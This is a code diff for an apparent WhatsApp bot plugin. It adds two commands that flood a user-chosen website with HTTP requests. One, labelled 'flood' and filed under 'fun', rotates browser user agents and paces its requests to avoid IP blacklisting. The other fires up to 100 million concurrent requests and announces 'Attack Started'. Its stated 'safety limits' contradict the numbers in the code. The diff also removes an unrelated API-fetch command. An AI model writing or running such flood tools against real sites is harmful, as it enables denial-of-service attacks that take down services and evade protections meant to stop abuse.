@@ -28,6 +28,165 @@ const fkontak = {
     },
 };
 
+
+
+
+
+// List of diverse User Agents to mimic different browsers
+const userAgentList = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0'
+];
+
+cmd({
+    pattern: "request",
+    alias: ["site-test", "flood"],
+    desc: "Simulate visitor traffic and analyze site responses.",
+    category: "fun",
+    react: "🚀",
+    use: '.request <url> <amount>',
+    filename: __filename
+},
+async (conn, mek, m, { from, args, reply }) => {
+    try {
+        const site = args[0];
+        const numRequests = parseInt(args[1]);
+
+        // Input Validation
+        if (!site || isNaN(numRequests) || numRequests <= 0) {
+            return reply('❌ *Invalid Usage!*\n\nPlease provide a valid URL and number of requests.\nExample: `.request google.com 20`');
+        }
+
+        // Safety Limit to prevent bot hanging
+        if (numRequests > 10000000) {
+            return reply('⚠️ *Safety Limit:* You can only send up to 100000000 requests at a time.');
+        }
+
+        const siteUrl = site.startsWith('http') ? site : `https://${site}`;
+        
+        // Tracking Variables
+        let successCount = 0;
+        let failCount = 0;
+        let cloudflareCount = 0; // 403 Forbidden
+        let rateLimitCount = 0;  // 429 Too Many Requests
+        let timeoutCount = 0;    // Connection Timeout
+        let otherErrorCount = 0;
+
+        await reply(`⏳ *Processing:* Sending ${numRequests} requests to ${siteUrl}...`);
+
+        function getRandomUserAgent() {
+            return userAgentList[Math.floor(Math.random() * userAgentList.length)];
+        }
+
+        // Execution Loop
+        for (let i = 0; i < numRequests; i++) {
+            try {
+                await axios.get(siteUrl, {
+                    headers: { 
+                        'User-Agent': getRandomUserAgent(),
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+                        'Accept-Language': 'en-US,en;q=0.5',
+                        'Connection': 'keep-alive',
+                        'Upgrade-Insecure-Requests': '1'
+                    },
+                    timeout: 5000 // 5 seconds timeout
+                });
+                successCount++;
+            } catch (error) {
+                failCount++;
+                if (error.response) {
+                    const status = error.response.status;
+                    if (status === 403) {
+                        cloudflareCount++; // Likely Cloudflare WAF, Captcha, or IP Block
+                    } else if (status === 429) {
+                        rateLimitCount++; // Server-side Rate Limiting
+                    } else {
+                        otherErrorCount++;
+                    }
+                } else if (error.code === 'ECONNABORTED') {
+                    timeoutCount++; // Request took too long
+                } else {
+                    otherErrorCount++;
+                }
+            }
+            
+            // Minimal delay to prevent instant IP blacklisting
+            await new Promise(resolve => setTimeout(resolve, 200));
+        }
+
+        // Generate Final Report
+        let report = `📊 *REQUEST ANALYSIS REPORT* 📊\n\n`;
+        report += `🌐 *Target:* ${siteUrl}\n`;
+        report += `🏁 *Total Requests:* ${numRequests}\n\n`;
+        
+        report += `✅ *Successful:* ${successCount}\n`;
+        report += `❌ *Failed:* ${failCount}\n\n`;
+        
+        if (failCount > 0) {
+            report += `🔍 *Failure Breakdown:* \n`;
+            report += `🛡️ Cloudflare/Blocked (403): ${cloudflareCount}\n`;
+            report += `⏳ Rate Limited (429): ${rateLimitCount}\n`;
+            report += `🔌 Timeouts: ${timeoutCount}\n`;
+            report += `⚠️ Others: ${otherErrorCount}\n\n`;
+        }
+
+        // Conclusion Logic
+        if (cloudflareCount > (numRequests / 2)) {
+            report += `📢 *Verdict:* This site is heavily protected by Cloudflare or a Firewall.`;
+        } else if (successCount === numRequests) {
+            report += `🔥 *Verdict:* All requests passed through successfully!`;
+        } else if (rateLimitCount > 0) {
+            report += `📢 *Verdict:* The server detected the flood and started Rate Limiting.`;
+        }
+
+        return reply(report);
+
+    } catch (e) {
+        console.error(e);
+        reply('❌ *Error:* Something went wrong while executing the command.');
+    }
+});
+cmd({
+    pattern: "b",
+    react: "🌑",
+    alias: ["sboom", "ghost"],
+    desc: "Silent ultra-fast request burst with a single end-report.",
+    category: "owner",
+    use: ".silentboom <url> <amount>",
+    filename: __filename
+}, async (conn, mek, m, { reply, args }) => {
+    try {
+        const url = args[0];
+        const count = parseInt(args[1]);
+
+        if (!url || !count) return reply("⚠️ Usage: .silentboom <url> <amount>");
+        if (count > 100000000) return reply("❌ Limit exceeded for safety (Max: 500).");
+
+        await reply(`🚀 *Attack Started:* Sending ${count} requests to ${url}...`);
+
+        // Request tika store karana array ekak
+        const requests = [];
+
+        for (let i = 0; i < count; i++) {
+            // Axios request eka promise ekak widiyata array ekata danna
+            // .catch use karanne ekak fail unath anith tika stop wenne nathi wenna
+            requests.push(axios.get(url).catch(() => null));
+        }
+
+        // Okkoma requests iwara wenakan wait karanawa
+        await Promise.all(requests);
+
+        // Okkoma iwara unama success message eka
+        return reply(`✅ *Boom Success!* \n\n🎯 Target: ${url}\n📊 Total Requests: ${count}\n⚡ Status: Completed without crashing.`);
+
+    } catch (e) {
+        console.log(e);
+        reply("⚠️ An error occurred. Check the URL format.");
+    }
+});
+
 cmd({
     pattern: "packages",
     react: "📡",
@@ -88,59 +247,7 @@ async (conn, mek, m, { from, reply }) => {
 });
 
 
-cmd({
-  pattern: "axios",
-  react: "🌐",
-  alias: ["fetchapi", "getjson"],
-  desc: "Fetch JSON data from any API",
-  category: "developer",
-  use: '.axios <API Link>',
-  dontAddCommandList: false,
-  filename: __filename
-},
-async (conn, mek, m, { from, q, reply }) => {
-  try {
 
-    if (!q) {
-      return reply('❗ Please provide a valid API Link.\n\n*Example:* .axios https://podda-api.zone.id/ytsearch?url=uber');
-    }
-
-    const url = q.trim();
-    const urlRegex = /^(https?:\/\/[^\s]+)/;
-
-    if (!urlRegex.test(url)) {
-      return reply('❗ The provided URL is invalid. Please check the link and try again.');
-    }
-
-
-    await conn.sendMessage(from, { react: { text: '⏳', key: mek.key } });
-
-
-    const response = await axios.get(url);
-    const data = response.data;
-
-
-    let jsonString = JSON.stringify(data, null, 2);
-
-
-    if (jsonString.length > 4000) {
-      jsonString = jsonString.substring(0, 4000) + '\n\n... [Result truncated due to length]';
-    }
-
-
-    const messageText = `*📡 API Response:*\n\n\`\`\`json\n${jsonString}\n\`\`\``;
-    await reply(messageText);
-
-
-    await conn.sendMessage(from, { react: { text: '✅', key: mek.key } });
-
-  } catch (e) {
-    console.log(e);
-
-    const errorMsg = e.response ? e.response.statusText : e.message;
-    reply(`❗ Error occurred: ${errorMsg}`);
-  }
-});
 
 
 cmd({
